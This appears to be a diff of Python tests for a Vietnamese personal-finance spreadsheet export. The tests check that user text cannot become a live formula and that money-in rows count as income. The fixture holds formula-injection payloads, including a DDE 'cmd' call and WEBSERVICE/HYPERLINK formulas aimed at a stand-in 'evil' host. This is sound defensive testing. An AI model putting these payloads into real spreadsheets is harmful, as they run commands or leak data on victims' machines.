@@ -171,6 +171,90 @@ def test_export_data_is_empty_property():
 
 
 # ---------------------------------------------------------------------------
+# Formula injection — user-typed text must never execute on open
+# ---------------------------------------------------------------------------
+
+
+def _injection_data() -> ExportData:
+    """Every user-controlled text field carries a formula-looking value."""
+    return ExportData(
+        assets=(
+            AssetRow(
+                asset_type="=cmd|'/c calc'!A1",
+                name="=HYPERLINK(\"http://evil\",\"click\")",
+                current_value=Decimal("1"),
+                initial_value=Decimal("1"),
+                gain_loss=Decimal("0"),
+                acquired_at=None,
+                last_valued_at=None,
+            ),
+        ),
+        cashflow=(
+            CashflowRow(
+                is_income=False,
+                on_date=None,
+                label="-tiền taxi",
+                note="@SUM(A1:A9)",
+                amount=Decimal("1"),
+            ),
+            CashflowRow(
+                is_income=True,
+                on_date=None,
+                label="+thưởng",
+                note="=1+1",
+                amount=Decimal("1"),
+            ),
+        ),
+        goals=(
+            GoalRow(
+                name="=WEBSERVICE(\"http://evil\")",
+                target_amount=Decimal("1"),
+                current_amount=Decimal("0"),
+                remaining_amount=Decimal("1"),
+                progress_pct=Decimal("0.0"),
+                target_date=None,
+            ),
+        ),
+    )
+
+
+@pytest.mark.parametrize(
+    ("sheet_idx", "cells"),
+    [
+        (0, ((2, 1), (2, 2))),  # asset type label + name
+        (1, ((2, 3), (2, 4), (3, 3), (3, 4))),  # cashflow label + note
+        (2, ((2, 1),)),  # goal name
+    ],
+)
+def test_user_text_never_lands_as_a_live_formula(sheet_idx, cells):
+    """A cell whose text starts with = + - @ is a formula in Excel/Sheets.
+    Every user-controlled cell must come back as inert text."""
+    ws = _load(build_workbook(_injection_data())).worksheets[sheet_idx]
+    for row, col in cells:
+        value = ws.cell(row=row, column=col).value
+        assert isinstance(value, str)
+        assert not value.startswith(("=", "+", "-", "@")), (
+            f"sheet {sheet_idx} cell ({row},{col}) is a live formula: {value!r}"
+        )
+
+
+def test_escaping_preserves_the_original_text():
+    """The escape is display-level only — the user still reads what they typed
+    (the leading apostrophe is Excel's literal marker, not lost data)."""
+    ws = _load(build_workbook(_injection_data())).worksheets[1]
+    assert ws.cell(row=2, column=3).value.lstrip("'") == "-tiền taxi"
+    assert ws.cell(row=2, column=4).value.lstrip("'") == "@SUM(A1:A9)"
+
+
+def test_ordinary_text_is_left_untouched():
+    """No apostrophe noise on the 99.9% of rows that look nothing like a
+    formula."""
+    ws = _load(build_workbook(_export_data())).worksheets[1]
+    assert ws.cell(row=2, column=3).value == "Lương"
+    assert ws.cell(row=3, column=4).value == "cơm trưa"
+
+
+# ---------------------------------------------------------------------------
 # gather_export_data — row mapping (DB mocked)
 # ---------------------------------------------------------------------------
 
@@ -221,6 +305,7 @@ async def test_gather_maps_rows_and_sorts_cashflow_newest_first():
         merchant="Highlands",
         note=None,
         amount=Decimal("120000"),
+        transaction_type="expense",
     )
     goal = SimpleNamespace(
         name="Nhà",
@@ -241,6 +326,55 @@ async def test_gather_maps_rows_and_sorts_cashflow_newest_first():
     assert data.cashflow[0].amount == Decimal("120000")
     assert len(data.goals) == 1
     assert data.goals[0].progress_pct == Decimal("25.0")
+
+
+@pytest.mark.asyncio
+async def test_gather_maps_money_in_rows_as_income():
+    """``expenses`` holds both directions. A ``money_in`` row is money
+    arriving — exporting it under "Chi" would double-count the user's
+    outflow, so the row's own ``transaction_type`` decides the direction."""
+    spend = SimpleNamespace(
+        expense_date=date(2026, 7, 2),
+        category="Ăn uống",
+        merchant=None,
+        note=None,
+        amount=Decimal("120000"),
+        transaction_type="expense",
+    )
+    money_in = SimpleNamespace(
+        expense_date=date(2026, 7, 4),
+        category="income",
+        merchant=None,
+        note="thưởng dự án",
+        amount=Decimal("5000000"),
+        transaction_type="money_in",
+    )
+    db = _FakeDB([[], [], [money_in, spend], []])
+
+    data = await export_service.gather_export_data(db, uuid.uuid4())
+
+    by_date = {c.on_date: c for c in data.cashflow}
+    assert by_date[date(2026, 7, 4)].is_income is True
+    assert by_date[date(2026, 7, 2)].is_income is False
+
+
+@pytest.mark.asyncio
+async def test_money_in_row_lands_on_the_income_label_in_the_sheet():
+    """End-to-end: a money-in row must read "Thu" in the workbook, not "Chi"."""
+    money_in = SimpleNamespace(
+        expense_date=date(2026, 7, 4),
+        category="income",
+        merchant=None,
+        note="thưởng dự án",
+        amount=Decimal("5000000"),
+        transaction_type="money_in",
+    )
+    db = _FakeDB([[], [], [money_in], []])
+    xlsx, _ = await export_service.build_export(db, uuid.uuid4())
+
+    cashflow_ws = _load(xlsx).worksheets[1]
+    copy = export_service._sheet_copy("cashflow")
+    assert cashflow_ws.cell(row=2, column=1).value == copy["row_income"]
 
 
 @pytest.mark.asyncio
